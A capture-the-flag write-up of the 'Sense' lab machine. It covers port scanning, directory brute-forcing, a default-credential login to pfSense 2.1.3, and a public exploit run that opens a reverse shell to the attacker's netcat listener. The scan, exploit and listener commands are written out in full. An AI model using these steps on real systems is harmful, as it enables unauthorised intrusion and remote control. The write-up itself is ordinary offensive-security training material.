* [Recon-Enumeration](#recon-enumeration)
* [Exploit](#exploit)

![alt text](./img/sense00.PNG?raw=true)  

## Recon-Enumeration  
sudo masscan -p 1-65535 10.10.10.60 -e tun0 --rate=1000  
![alt text](./img/sense01.PNG?raw=true)  

nmap -A -sC -v -p 80,443 10.10.10.60  
![alt text](./img/sense02.PNG?raw=true)  

gobuster dir -u https://10.10.10.60 -w ~/wordlists/big.txt -t 100 -e -k -x php,html,aspx,txt,xml  
![alt text](./img/sense03.PNG?raw=true)  

Ok, we can notice that almost all the findings on gobuster with the status 200 have almost the same size 6690, if you access them it will be redirected to the login page. And the links with the status 301 are MOVED, so let’s try the other links

https://10.10.10.60/changelog.txt  
![alt text](./img/sense04.PNG?raw=true)  

So we have 1 vulnerability that wasn’t patched yet…. let’s continue

https://10.10.10.60/index.html  
![alt text](./img/sense05.PNG?raw=true)  

Hummm a different page, let’s check the source  
![alt text](./img/sense06.PNG?raw=true)  

We found information about a connection via ssh (what is strange since the port is not opened) with an applet  

After some research I found some interesting websites, however none of them helped. And here is where I got stuck…...so I returned to enumeration with a bigger wordlist to gobuster  

gobuster dir -u https://10.10.10.60 -w ~/wordlists/directory-list-2.3-medium.txt -t 100 -e -k -x php,html,aspx,txt,xml  
![alt text](./img/sense07.PNG?raw=true)  

This system-users.txt looks suspicious, let’s check it out  
![alt text](./img/sense08.PNG?raw=true)  

Now we have the USERNAME, since the password is “company defaults” and we are using pfsense, maybe the password is the default “pfsense”  
So let’s try with the credentials rohit:pfsense  
![alt text](./img/sense09.PNG?raw=true)  

## Exploit

So, since we are running pfsense 2.1.3 let’s see if we find a exploit to it  
searchsploit pfsense 2.1.3  
![alt text](./img/sense10.PNG?raw=true)  

searchsploit -x php/webapps/43560.py  
![alt text](./img/sense11.PNG?raw=true)  

Reading the exploit we notice it will get a CSRF token and run a python reverse shell. To work we need give some arguments (--rhost, --lhost, --lport, --username, --password).....very similar to metasploit

So let’s start our netcat listener and run the command  
- nc -nvlp 1234  
- python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.5 --lport 1234 --username rohit --password pfsense  

![alt text](./img/sense12.PNG?raw=true)  

![alt text](./img/sense13.PNG?raw=true)  

HABEMUS SHELL \o/

Since we are root just grab the flags  
![alt text](./img/sense14.PNG?raw=true)  
